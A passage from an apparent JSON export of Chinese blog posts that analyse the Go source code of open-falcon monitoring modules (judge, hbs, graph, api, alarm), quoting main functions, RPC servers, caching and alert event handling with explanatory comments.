expression,\n\t\tEndpoint:   firstItem.Endpoint,\n\t\tLeftValue:  leftValue,\n\t\tEventTime:  firstItem.Timestamp,\n\t\tPushedTags: firstItem.Tags,\n\t}\n\n\tsendEventIfNeed(historyData, isTriggered, now, event, expression.MaxStep)\n\n}\n```\n\n其中使用fn.Compute使用的是离群点检测函数，更多请参考3-sigma算法，https://en.wikipedia.org/wiki/68%E2%80%9395%E2%80%9399.7_rule\nstddev(#10) = 3 //取最新 **10** 个点的数据分别计算得到他们的标准差和均值，分别计为 σ 和 μ，其中当前值计为 X，那么当 X 落在区间 [μ-3σ, μ+3σ] 之外时则报警。\n\n接下来SyncStrategies函数从HBS同步策略：\n\n```go\nfunc SyncStrategies() {\n\tduration := time.Duration(g.Config().Hbs.Interval) * time.Second\n\tfor {\n\t\tsyncStrategies()   //同步策略\n\t\tsyncExpression()   //同步表达式\n\t\tsyncFilter()       //同步过滤器\n\t\ttime.Sleep(duration)\n\t}\n}\n```\n\n```go\nfunc syncStrategies() {\n\tvar strategiesResponse model.StrategiesResponse\n\terr := g.HbsClient.Call(\"Hbs.GetStrategies\", model.NullRpcRequest{}, &strategiesResponse)  //调用HBS rpc接口数据数据\n\tif err != nil {\n\t\tlog.Println(\"[ERROR] Hbs.GetStrategies:\", err)\n\t\treturn\n\t}\n\n\trebuildStrategyMap(&strategiesResponse)  //重建策略数据结构\n}\n```\n\n```go\nfunc syncExpression() {\n\tvar expressionResponse model.ExpressionResponse\n\terr := g.HbsClient.Call(\"Hbs.GetExpressions\", model.NullRpcRequest{}, &expressionResponse)   //调用HBS接口返回数据\n\tif err != nil {\n\t\tlog.Println(\"[ERROR] Hbs.GetExpressions:\", err)\n\t\treturn\n\t}\n\n\trebuildExpressionMap(&expressionResponse)  // 重建表达式数据结构\n}\n```\n\n```go\nfunc syncFilter() {\n\tm := make(map[string]string)\n\n\t//M map[string][]model.Strategy\n\tstrategyMap := g.StrategyMap.Get()\n\tfor _, strategies := range strategyMap {\n\t\tfor _, strategy := range strategies {\n\t\t\tm[strategy.Metric] = strategy.Metric\n\t\t}\n\t}\n\n\t//M map[string][]*model.Expression\n\texpressionMap := g.ExpressionMap.Get()\n\tfor _, expressions := range expressionMap {\n\t\tfor _, expression := range expressions {\n\t\t\tm[expression.Metric] = expression.Metric\n\t\t}\n\t}\n\n\tg.FilterMap.ReInit(m)  // 设置获取到的map数据结构\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon hbs 源码分析","url":"/2020/01/21/hbs源码分析/","content":"## open-falcon hbs源码分析\n\n本篇文章主要分析下open-falcon中hbs如何实现的：\n\n主流程再modules/hbs/main.go模块中：\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\t// 解析配置文件\n\tg.ParseConfig(*cfg)\n\t// 初始化数据库，检查数据库是否可以连接，连接失败退出。\n\tdb.Init()\n    // 初始化缓存，从数据库中查询数据加载到缓存中。\n\tcache.Init()\n\t// 删除没有心跳的agent\n\tgo cache.DeleteStaleAgents()\n\t// 启动hbs http服务\n\tgo http.Start()\n    // 启动 rpc服务\n\tgo rpc.Start()\n\n    //信号量检查\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tdb.DB.Close()\n\t\tos.Exit(0)\n\t}()\n\n\tselect {}\n}\n```\n\ndb初始化函数Init:\n\n```go\nfunc Init() {\n\tvar err error\n\tDB, err = sql.Open(\"mysql\", g.Config().Database)\n\tif err != nil {\n\t\tlog.Fatalln(\"open db fail:\", err)\n\t}\n\n\tDB.SetMaxOpenConns(g.Config().MaxConns)\n\tDB.SetMaxIdleConns(g.Config().MaxIdle)\n\n\terr = DB.Ping()\n\tif err != nil {\n\t\tlog.Fatalln(\"ping db fail:\", err)\n\t}\n}\n```\n\n初始化缓存数据：\n\n```go\nfunc Init() {\n\tlog.Println(\"cache begin\")\n\t// 查询group与plugins的关系到缓存中\n\tlog.Println(\"#1 GroupPlugins...\")\n\tGroupPlugins.Init()\n\t// 查询group与template的关系到缓存中\n\tlog.Println(\"#2 GroupTemplates...\")\n\tGroupTemplates.Init()\n\t// 查询host与group的关系到缓存中\n\tlog.Println(\"#3 HostGroupsMap...\")\n\tHostGroupsMap.Init()\n\t//查询所有的host信息到缓存，方便查询hostname->id\n\tlog.Println(\"#4 HostMap...\")\n\tHostMap.Init()\n\t//查询所有的template信息到缓存中\n\tlog.Println(\"#5 TemplateCache...\")\n\tTemplateCache.Init()\n\t//查询对应模块的策略信息到缓存中\n\tlog.Println(\"#6 Strategies...\")\n\tStrategies.Init(TemplateCache.GetMap())\n\t//查询host与template的缓存信息，一个id对应多个模块ID\n\tlog.Println(\"#7 HostTemplateIds...\")\n\tHostTemplateIds.Init()\n\t//查询所有表达式到缓存中\n\tlog.Println(\"#8 ExpressionCache...\")\n\tExpressionCache.Init()\n\t// 查询被监控的host信息缓存\n\tlog.Println(\"#9 MonitoredHosts...\")\n\tMonitoredHosts.Init()\n\n\tlog.Println(\"cache done\")\n\t\n\tgo LoopInit() //定时查询更新，比较消耗资源。\n\n}\n```\n\n定时检查当前agents列表中的信息心跳最后更新时间：\n\n```go\nfunc deleteStaleAgents() {\n\t// 一天都没有心跳的Agent，从内存中干掉\n\tbefore := time.Now().Unix() - 3600*24\n\tkeys := Agents.Keys()\n\tcount := len(keys)\n\tif count == 0 {\n\t\treturn\n\t}\n\n\tfor i := 0; i < count; i++ {\n\t\tcurr, _ := Agents.Get(keys[i])\n\t\tif curr.LastUpdate < before {\n\t\t\tAgents.Delete(curr.ReportRequest.Hostname)\n\t\t}\n\t}\n}\n```\n\nhttp服务初始化：\n\n```go\n//init函数\nfunc init() {\n\tconfigCommonRoutes()  //注册通用api\n\tconfigProcRoutes()    //注册获取策略等信息\n}\n```\n\nrpc接口初始化：\n\n```go\nfunc Start() {\n\taddr := g.Config().Listen\n\n\tserver := rpc.NewServer()\n\t// server.Register(new(filter.Filter))\n\tserver.Register(new(Agent))\n\tserver.Register(new(Hbs))\n\n\tl, e := net.Listen(\"tcp\", addr)\n\tif e != nil {\n\t\tlog.Fatalln(\"listen error:\", e)\n\t} else {\n\t\tlog.Println(\"listening\", addr)\n\t}\n\n\tfor {\n\t\tconn, err := l.Accept()\n\t\tif err != nil {\n\t\t\tlog.Println(\"listener accept fail:\", err)\n\t\t\ttime.Sleep(time.Duration(100) * time.Millisecond)\n\t\t\tcontinue\n\t\t}\n\t\tgo server.ServeCodec(jsonrpc.NewServerCodec(conn))\n\t}\n}\n```\n\n基本流程分析完毕，我们主要来看下hbs提供出来的rpc函数有那些：\n\nagent rpc接口：\n\n```go\nMinePlugin函数主要从缓存中查询plugins插件列表\nReportStatus获取到agent来的状态数据，更新缓存中的数据\nTrustableIps白名单，从配置文件中读取\nBuiltinMetrics，agent按照server端的配置，按需采集的metric\n```\n\nhbs rpc接口：\n\n```go\nGetExpressions 获取查询表达式\nGetStrategies 获取strategy策略，用于judge调用\n```\n\n我们来看下这个函数GetStrategies，这个函数主要用于给judge定时更新策略的。\n\n```go\nfunc (t *Hbs) GetStrategies(req model.NullRpcRequest, reply *model.StrategiesResponse) error {\n\treply.HostStrategies = []*model.HostStrategy{}\n\t// 一个机器ID对应多个模板ID\n\thidTids := cache.HostTemplateIds.GetMap()\n\tsz := len(hidTids)\n\tif sz == 0 {\n\t\treturn nil\n\t}\n\n\t// Judge需要的是hostname，此处要把HostId转换为hostname\n\t// 查出的hosts，是不处于维护时间内的\n\thosts := cache.MonitoredHosts.Get()\n\tif len(hosts) == 0 {\n\t\t// 所有机器都处于维护状态，汗\n\t\treturn nil\n\t}\n\t// 查询所有模板信息\n\ttpls := cache.TemplateCache.GetMap()\n\tif len(tpls) == 0 {\n\t\treturn nil\n\t}\n\t//查询所有策略信息\n\tstrategies := cache.Strategies.GetMap()\n\tif len(strategies) == 0 {\n\t\treturn nil\n\t}\n\n\t// 做个索引，给一个tplId，可以很方便的找到对应了哪些Strategy\n\ttpl2Strategies := Tpl2Strategies(strategies)\n\n\thostStrategies := make([]*model.HostStrategy, 0, sz)\n\tfor hostId, tplIds := range hidTids {\n\n\t\th, exists := hosts[hostId]\n\t\tif !exists {\n\t\t\tcontinue\n\t\t}\n\n\t\t// 计算当前host配置了哪些监控策略\n\t\tss := CalcInheritStrategies(tpls, tplIds, tpl2Strategies)\n\t\tif len(ss) <= 0 {\n\t\t\tcontinue\n\t\t}\n\n\t\ths := model.HostStrategy{\n\t\t\tHostname:   h.Name,\n\t\t\tStrategies: ss,\n\t\t}\n\n\t\thostStrategies = append(hostStrategies, &hs)\n\n\t}\n\n\treply.HostStrategies = hostStrategies\n\treturn nil\n}\n```\n\nTpl2Strategies函数根据strategies查询所有模板信息：\n\n```go\nfunc Tpl2Strategies(strategies map[int]*model.Strategy) map[int][]*model.Strategy {\n\tret := make(map[int][]*model.Strategy)\n\tfor _, s := range strategies {\n\t\tif s == nil || s.Tpl == nil {\n\t\t\tcontinue\n\t\t}\n\t\tif _, exists := ret[s.Tpl.Id]; exists {\n\t\t\tret[s.Tpl.Id] = append(ret[s.Tpl.Id], s)\n\t\t} else {\n\t\t\tret[s.Tpl.Id] = []*model.Strategy{s}\n\t\t}\n\t}\n\treturn ret\n}\n```\n\nCalcInheritStrategies函数用于计算当前host机器有多少策略：\n\n```go\nfunc CalcInheritStrategies(allTpls map[int]*model.Template, tids []int, tpl2Strategies map[int][]*model.Strategy) []model.Strategy {\n\t// 根据模板的继承关系，找到每个机器对应的模板全量\n\t/**\n\t * host_id =>\n\t * |a |d |a |a |a |\n\t * |  |  |b |b |f |\n\t * |  |  |  |c |  |\n\t * |  |  |  |  |  |\n\t */\n\ttpl_buckets := [][]int{}\n\tfor _, tid := range tids {\n        // 查找所有id的parentid\n\t\tids := cache.ParentIds(allTpls, tid)\n\t\tif len(ids) <= 0 {\n\t\t\tcontinue\n\t\t}\n\t\ttpl_buckets = append(tpl_buckets, ids)\n\t}\n\n\t// 每个host 关联的模板，有继承关系的放到同一个bucket中，其他的放在各自单独的bucket中\n\t/**\n\t * host_id =>\n\t * |a |d |a |\n\t * |b |  |f |\n\t * |c |  |  |\n\t * |  |  |  |\n\t */\n\tcount := len(tpl_buckets)\n\tuniq_tpl_buckets := [][]int{}\n\tfor i := 0; i < count; i++ {\n\t\tvar valid bool = true\n\t\tfor j := 0; j < count; j++ {\n\t\t\tif i == j {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tif slice_int_eq(tpl_buckets[i], tpl_buckets[j]) {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tif slice_int_lt(tpl_buckets[i], tpl_buckets[j]) {\n\t\t\t\tvalid = false\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\tif valid {\n\t\t\tuniq_tpl_buckets = append(uniq_tpl_buckets, tpl_buckets[i])\n\t\t}\n\t}\n\n\t// 继承覆盖父模板策略，得到每个模板聚合后的策略列表\n\tstrategies := []model.Strategy{}\n\n\texists_by_id := make(map[int]struct{})\n\tfor _, bucket := range uniq_tpl_buckets {\n\n\t\t// 开始计算一个桶，先计算老的tid，再计算新的，所以可以覆盖\n\t\t// 该桶最终结果\n\t\tbucket_stras_map := make(map[string][]*model.Strategy)\n\t\tfor _, tid := range bucket {\n\n\t\t\t// 一个tid对应的策略列表\n\t\t\tthe_tid_stras := make(map[string][]*model.Strategy)\n\n\t\t\tif stras, ok := tpl2Strategies[tid]; ok {\n\t\t\t\tfor _, s := range stras {\n\t\t\t\t\tuuid := fmt.Sprintf(\"metric:%s/tags:%v\", s.Metric, utils.SortedTags(s.Tags))\n\t\t\t\t\tif _, ok2 := the_tid_stras[uuid]; ok2 {\n\t\t\t\t\t\tthe_tid_stras[uuid] = append(the_tid_stras[uuid], s)\n\t\t\t\t\t} else {\n\t\t\t\t\t\tthe_tid_stras[uuid] = []*model.Strategy{s}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// 覆盖父模板\n\t\t\tfor uuid, ss := range the_tid_stras {\n\t\t\t\tbucket_stras_map[uuid] = ss\n\t\t\t}\n\t\t}\n\n\t\tlast_tid := bucket[len(bucket)-1]\n\n\t\t// 替换所有策略的模板为最年轻的模板\n\t\tfor _, ss := range bucket_stras_map {\n\t\t\tfor _, s := range ss {\n\t\t\t\tvalStrategy := *s\n\t\t\t\t// exists_by_id[s.Id] 是根据策略ID去重，不太确定是否真的需要，不过加上肯定没问题\n\t\t\t\tif _, exist := exists_by_id[valStrategy.Id]; !exist {\n\t\t\t\t\tif valStrategy.Tpl.Id != last_tid {\n\t\t\t\t\t\tvalStrategy.Tpl = allTpls[last_tid]\n\t\t\t\t\t}\n\t\t\t\t\tstrategies = append(strategies, valStrategy)\n\t\t\t\t\texists_by_id[valStrategy.Id] = struct{}{}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn strategies\n}\n```\n\nhbs中主要的功能分析完毕。相应的需要结合judge和agent来看各个rpc接口调用关系了。\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon graph 源码分析","url":"/2020/01/21/graph源码分析/","content":"## open-falcon graph源码分析\n\ngraph主流程在modules/graph/main中：\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"specify config file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tversionGit := flag.Bool(\"vg\", false, \"show version and git commit log\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\tif *versionGit {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\t// global config\n    // 解析配置文件\n\tg.ParseConfig(*cfg)\n\n\tif g.Config().Debug {\n\t\tg.InitLog(\"debug\")\n\t} else {\n\t\tg.InitLog(\"info\")\n\t}\n\n\t// init db\n    // 初始化数据库，连接不上失败\n\tg.InitDB()\n\t// rrdtool init\n    // rrd初始化\n\trrdtool.InitChannel()\n\t// rrdtool before api for disable loopback connection\n\trrdtool.Start()\n\t// start api\n\tgo api.Start()\n\t// start indexing\n    // index更新，定期刷新数据到数据库中\n\tindex.Start()\n\t// start http server\n\tgo http.Start()\n    // 定时清理无效数据\n\tgo cron.CleanCache()\n\n\tstart_signal(os.Getpid(), g.Config())\n}\n```\n\nrrdtool启动，启动协程定时写磁盘数据\n\n```go\nfunc Start() {\n\tcfg := g.Config()\n\tvar err error\n\t// check data dir\n\tif err = file.EnsureDirRW(cfg.RRD.Storage); err != nil {\n\t\tlog.Fatalln(\"rrdtool.Start error, bad data dir \"+cfg.RRD.Storage+\",\", err)\n\t}\n\t\n\tmigrate_start(cfg)\n\n\t// sync disk\n    // 写入rdd数据\n\tgo syncDisk()\n    // task不同任务刷新\n\tgo ioWorker()\n\tlog.Println(\"rrdtool.Start ok\")\n}\n```\n\napi模块启动\n\n```go\nfunc Start() {\n\tif !g.Config().Rpc.Enabled {\n\t\tlog.Println(\"rpc.Start warning, not enabled\")\n\t\treturn\n\t}\n\taddr := g.Config().Rpc.Listen\n\ttcpAddr, err := net.ResolveTCPAddr(\"tcp\", addr)\n\tif err != nil {\n\t\tlog.Fatalf(\"rpc.Start error, net.ResolveTCPAddr failed, %s\", err)\n\t}\n\n\tlistener, err := net.ListenTCP(\"tcp\", tcpAddr)\n\tif err != nil {\n\t\tlog.Fatalf(\"rpc.Start error, listen %s failed, %s\", addr, err)\n\t} else {\n\t\tlog.Println(\"rpc.Start ok, listening on\", addr)\n\t}\n\n\trpc.Register(new(Graph))  // rpc接口注册\n\n\tgo func() {\n\t\tvar tempDelay time.Duration // how long to sleep on accept failure\n\t\tfor {\n\t\t\tconn, err := listener.Accept()\n\t\t\tif err != nil {\n\t\t\t\tif tempDelay == 0 {\n\t\t\t\t\ttempDelay = 5 * time.Millisecond\n\t\t\t\t} else {\n\t\t\t\t\ttempDelay *= 2\n\t\t\t\t}\n\t\t\t\tif max := 1 * time.Second; tempDelay > max {\n\t\t\t\t\ttempDelay = max\n\t\t\t\t}\n\t\t\t\ttime.Sleep(tempDelay)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\ttempDelay = 0\n\t\t\tgo func() {\n\t\t\t\te := connects.insert(conn)\n\t\t\t\tdefer connects.remove(e)\n\t\t\t\trpc.ServeConn(conn)\n\t\t\t}()\n\t\t}\n\t}()\n\n\tselect {\n\tcase <-Close_chan:\n\t\tlog.Println(\"rpc, recv sigout and exiting...\")\n\t\tlistener.Close()\n\t\tClose_done_chan <- 1\n\n\t\tconnects.Lock()\n\t\tfor e := connects.list.Front(); e != nil; e = e.Next() {\n\t\t\te.Value.(net.Conn).Close()\n\t\t}\n\t\tconnects.Unlock()\n\n\t\treturn\n\t}\n\n}\n```\n\n接下来初始化内存索引信息：\n\n```go\nfunc Start() {\n\tInitCache()   //初始化缓存cache统计信息\n\tgo StartIndexUpdateIncrTask()   //更新索引任务\n\tlog.Debug(\"index.Start ok\")\n}\n```\n\n```go\n// 启动索引的 异步、增量更新 任务, 每隔一定时间，刷新cache中的数据到数据库中\nfunc StartIndexUpdateIncrTask() {\n\tfor {\n\t\ttime.Sleep(IndexUpdateIncrTaskSleepInterval)\n\t\tstartTs := time.Now().Unix()\n\t\tcnt := updateIndexIncr()\n\t\tendTs := time.Now().Unix()\n\t\t// statistics\n\t\tproc.IndexUpdateIncrCnt.SetCnt(int64(cnt))\n\t\tproc.IndexUpdateIncr.Incr()\n\t\tproc.IndexUpdateIncr.PutOther(\"lastStartTs\", ntime.FormatTs(startTs))\n\t\tproc.IndexUpdateIncr.PutOther(\"lastTimeConsumingInSec\", endTs-startTs)\n\t}\n}\n```\n\n主要针对一些收集到的指标数据更新到数据库中。方便后续查询和报警使用：\n\n```go\n// 进行一次增量更新\nfunc updateIndexIncr() int {\n\tret := 0\n\tif unIndexedItemCache == nil || unIndexedItemCache.Size() <= 0 {\n\t\treturn ret\n\t}\n\n\tdbConn, err := g.GetDbConn(\"UpdateIndexIncrTask\")\n\tif err != nil {\n\t\tlog.Error(\"[ERROR] get dbConn fail\", err)\n\t\treturn ret\n\t}\n\n\tkeys := unIndexedItemCache.Keys()\n\tfor _, key := range keys {\n\t\ticitem := unIndexedItemCache.Get(key)\n\t\tunIndexedItemCache.Remove(key)\n\t\tif icitem != nil {\n\t\t\t// 并发更新mysql\n\t\t\tsemaUpdateIndexIncr.Acquire()\n\t\t\tgo func(key string, icitem *IndexCacheItem, dbConn *sql.DB) {\n\t\t\t\tdefer semaUpdateIndexIncr.Release()\n\t\t\t\terr := updateIndexFromOneItem(icitem.Item, dbConn)  // 更新数据到数据库\n\t\t\t\tif err != nil {\n\t\t\t\t\tproc.IndexUpdateIncrErrorCnt.Incr()\n\t\t\t\t} else {\n\t\t\t\t\tIndexedItemCache.Put(key, icitem)\n\t\t\t\t}\n\t\t\t}(key, icitem.(*IndexCacheItem), dbConn)\n\t\t\tret++\n\t\t}\n\t}\n\n\treturn ret\n}\n```\n\nhttp服务启动\n\n```go\nfunc Start() {\n\tif !g.Config().Http.Enabled {\n\t\tlog.Println(\"http.Start warning, not enabled\")\n\t\treturn\n\t}\n\n\tif !g.Config().Debug {\n\t\tgin.SetMode(gin.ReleaseMode)\n\t}\n\n\trouter = gin.Default()\n\n\tconfigCommonRoutes()\n\tconfigProcRoutes()\n\tconfigIndexRoutes()\n\n\trouter.GET(\"/api/v2/counter/migrate\", func(c *gin.Context) {\n\t\tcounter := rrdtool.GetCounterV2()\n\t\tlog.Debug(\"migrating counter v2:\", fmt.Sprintf(\"%+v\", counter))\n\t\tc.JSON(200, counter)\n\t})\n\n\t//compatible with open-falcon v0.1\n\trouter.GET(\"/counter/migrate\", func(c *gin.Context) {\n\t\tcnt := rrdtool.GetCounter()\n\t\tlog.Debug(\"migrating counter:\", cnt)\n\t\tc.JSON(200, gin.H{\"msg\": \"ok\", \"counter\": cnt})\n\t})\n\n\taddr := g.Config().Http.Listen\n\tif addr == \"\" {\n\t\treturn\n\t}\n\tgo router.Run(addr)\n\n\tselect {\n\tcase <-Close_chan:\n\t\tlog.Info(\"http recv sigout and exit...\")\n\t\tClose_done_chan <- 1\n\t\treturn\n\t}\n\n}\n```\n\n定时清理无效数据\n\n```go\nfunc CleanCache() {\n\n\tticker := time.NewTicker(time.Duration(g.CLEAN_CACHE) * time.Second)\n\tdefer ticker.Stop()\n\tfor {\n\t\t<-ticker.C\n\t\tDeleteInvalidItems()   // 删除无效的GraphItems\n\t\tDeleteInvalidHistory() // 删除无效的HistoryCache\n\t}\n}\n```\n\n接下来还是看下graph是如何存储数据的：\n\n接收数据函数是在handleItem函数中：\n\n```go\nfunc handleItems(items []*cmodel.GraphItem) {\n\tif items == nil {\n\t\treturn\n\t}\n\n\tcount := len(items)\n\tif count == 0 {\n\t\treturn\n\t}\n\n\tcfg := g.Config()\n\n\tfor i := 0; i < count; i++ {\n\t\tif items[i] == nil {\n\t\t\tcontinue\n\t\t}\n\n\t\tendpoint := items[i].Endpoint\n\t\tif !g.IsValidString(endpoint) {\n\t\t\tlog.Debugf(\"invalid endpoint: %s\", endpoint)\n\t\t\tpfc.Meter(\"invalidEnpoint\", 1)\n\t\t\tcontinue\n\t\t}\n\n\t\tcounter := cutils.Counter(items[i].Metric, items[i].Tags)\n\t\tif !g.IsValidString(counter) {\n\t\t\tlog.Debugf(\"invalid counter: %s/%s\", endpoint, counter)\n\t\t\tpfc.Meter(\"invalidCounter\", 1)\n\t\t\tcontinue\n\t\t}\n\n\t\tdsType := items[i].DsType\n\t\tstep := items[i].Step\n\t\tchecksum := items[i].Checksum()\n\t\tkey := g.FormRrdCacheKey(checksum, dsType, step)\n\n\t\t//statistics\n\t\tproc.GraphRpcRecvCnt.Incr()\n\n\t\t// To Graph\n\t\tfirst := store.GraphItems.First(key)\n\t\tif first != nil && items[i].Timestamp <= first.Timestamp {\n\t\t\tcontinue\n\t\t}\n        // 放入缓存队列\n\t\tstore.GraphItems.PushFront(key, items[i], checksum, cfg)\n\n\t\t// To Index\n\t\tindex.ReceiveItem(items[i], checksum)\n\n\t\t// To History\n\t\tstore.AddItem(checksum, items[i])\n\t}\n}\n```\n\n接收到数据先放到缓存队列，然后写入rrd磁盘或者写入到数据库中完成存档。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon api 源码分析","url":"/2020/01/21/api源码分析/","content":"## open-falcon api源码分析\n\n主流程在module/api/main\n\n```go\nfunc main() {\n\tconfig.BinaryName = BinaryName\n\tconfig.Version = Version\n\tconfig.GitCommit = GitCommit\n\n\tcfgTmp := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\thelp := flag.Bool(\"h\", false, \"help\")\n\tflag.Parse()\n\tcfg := *cfgTmp\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *help {\n\t\tflag.Usage()\n\t\tos.Exit(0)\n\t}\n\n\tviper.AddConfigPath(\".\")\n\tviper.AddConfigPath(\"/\")\n\tviper.AddConfigPath(\"./config\")\n\tviper.AddConfigPath(\"./api/config\")\n\tcfg = strings.Replace(cfg, \".json\", \"\", 1)\n\tviper.SetConfigName(cfg)\n\n\terr := viper.ReadInConfig()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n    // 日志初始化\n\terr = config.InitLog(viper.GetString(\"log_level\"))\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n    //初始化数据\n\terr = config.InitDB(viper.GetBool(\"db.db_bug\"), viper.GetViper())\n\tif err != nil {\n\t\tlog.Fatalf(\"db conn failed with error %s\", err.Error())\n\t}\n\n\tif viper.GetString(\"log_level\") != \"debug\" {\n\t\tgin.SetMode(gin.ReleaseMode)\n\t}\n    // gin初始化\n\troutes := gin.Default()\n\tif viper.GetBool(\"gen_doc\") {\n\t\tyaag.Init(&yaag.Config{\n\t\t\tOn:       true,\n\t\t\tDocTitle: \"Gin\",\n\t\t\tDocPath:  viper.GetString(\"gen_doc_path\"),\n\t\t\tBaseUrls: map[string]string{\"Production\": \"/api/v1\", \"Staging\": \"/api/v1\"},\n\t\t})\n\t\troutes.Use(yaag_gin.Document())\n\t}\n    //启动graph服务，启动服务一致性hash\n\tinitGraph()\n\t//start gin server\n\tlog.Debugf(\"will start with port:%v\", viper.GetString(\"web_port\"))\n\tgo controller.StartGin(viper.GetString(\"web_port\"), routes)\n\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tos.Exit(0)\n\t}()\n\tselect {}\n}\n```\n\ninitGraph函数中启动graph服务\n\n```go\nfunc Start(addrs map[string]string) {\n\tclusterMap = addrs\n\tconnTimeout = int32(viper.GetInt(\"graphs.conn_timeout\"))\n\tcallTimeout = int32(viper.GetInt(\"graphs.call_timeout\"))\n\tfor c := range clusterMap {\n\t\tgcluster = append(gcluster, c)\n\t}\n\tdefer func() {\n\t\tif r := recover(); r != nil {\n\t\t\tlog.Errorf(\"graph got painc:%v\", r)\n\t\t\tStart(clusterMap)\n\t\t}\n\t}()\n\tinitNodeRings(clusterMap)  //初始化一致性hash\n\tinitConnPools(clusterMap)  //初始化rpc连接池\n\tlog.Println(\"graph.Start ok\")\n}\n```\n\n\n\nStartGin注册路由并启动：\n\n```go\nfunc StartGin(port string, r *gin.Engine) {\n\tr.Use(utils.CORS())\n\tr.GET(\"/\", func(c *gin.Context) {\n\t\tc.String(http.StatusOK, \"Hello, I'm Falcon+ (｡A｡)\")\n\t})\n\tgraph.Routes(r)\n\tuic.Routes(r)\n\ttemplate.Routes(r)\n\tstrategy.Routes(r)\n\thost.Routes(r)\n\texpression.Routes(r)\n\tmockcfg.Routes(r)\n\tdashboard_graph.Routes(r)\n\tdashboard_screen.Routes(r)\n\talarm.Routes(r)\n\tr.Run(port)\n}\n```\n\n这边api主要是在gin中注册信息，提供增删改查的功能，具体可能需要仔细去看下了。详细的这边就不描述了。\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon alarm 源码分析","url":"/2020/01/21/alarm源码分析/","content":"\n## open-falcon alarm 源码分析\n\n主函数在modules/alarm/main中\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\thelp := flag.Bool(\"h\", false, \"help\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *help {\n\t\tflag.Usage()\n\t\tos.Exit(0)\n\t}\n\n\tg.ParseConfig(*cfg)\n\n\tg.InitLog(g.Config().LogLevel)\n\tif g.Config().LogLevel != \"debug\" {\n\t\tgin.SetMode(gin.ReleaseMode)\n\t}\n\t//初始化redis连接池\n\tg.InitRedisConnPool()\n    // 初始化数据库\n\tmodel.InitDatabase()\n    // 启动定时发送channel\n\tcron.InitSenderWorker()\n\t// 启动http服务\n\tgo http.Start()\n    // 定时读取highevent\n\tgo cron.ReadHighEvent()\n    // 定时读取lowevent\n\tgo cron.ReadLowEvent()\n    // 组装Mail信息，群发功能\n\tgo cron.CombineSms()\n\tgo cron.CombineMail()\n\tgo cron.CombineIM()\n    // 发送邮件功能\n\tgo cron.ConsumeIM()\n\tgo cron.ConsumeSms()\n\tgo cron.ConsumeMail()\n    // 清理过期事件\n\tgo cron.CleanExpiredEvent()\n\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tg.RedisConnPool.Close()\n\t\tos.Exit(0)\n\t}()\n\n\tselect {}\n}\n```\n\n事件读取任务以highevent为例子：\n\n```go\nfunc ReadHighEvent() {\n    // 获取优先级高的队列\n\tqueues := g.Config().Redis.HighQueues\n\tif len(queues) == 0 {\n\t\treturn\n\t}\n\n\tfor {\n        //  出队\n\t\tevent, err := popEvent(queues)\n\t\tif err != nil {\n\t\t\ttime.Sleep(time.Second)\n\t\t\tcontinue\n\t\t}\n        // 消费队列\n\t\tconsume(event, true)\n\t}\n}\n```\n\n```go\nfunc consume(event *cmodel.Event, isHigh bool) {\n\tactionId := event.ActionId()\n\tif actionId <= 0 {\n\t\treturn\n\t}\n\n\taction := api.GetAction(actionId)\n\tif action == nil {\n\t\treturn\n\t}\n\n\tif action.Callback == 1 {\n\t\tHandleCallback(event, action)\n\t}\n\n\tif isHigh {\n\t\tconsumeHighEvents(event, action)\n\t} else 